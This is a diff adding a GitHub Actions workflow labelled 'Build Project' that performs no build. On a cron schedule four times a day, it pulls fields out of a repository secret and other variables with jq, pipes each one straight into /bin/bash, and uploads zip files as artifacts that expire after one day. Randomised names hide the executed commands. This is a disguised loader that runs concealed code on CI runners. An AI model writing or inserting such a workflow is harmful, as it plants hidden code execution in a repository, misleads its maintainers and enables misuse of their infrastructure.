@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          lp016: ${{ secrets.lp016 }}
+        run: |
+          printf '%s' "$lp016" | jq -r .czfl17 | /bin/bash
+          printf '%s' "$mvjxx7" | jq -r .y14 | /bin/bash
+          echo $ppdw090 | jq -r .slgh4739 | /bin/bash
+          echo $tb2744 | jq -r .wz4898 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: hpaiUeLo
+          path: "*.zip"
+          retention-days: 1
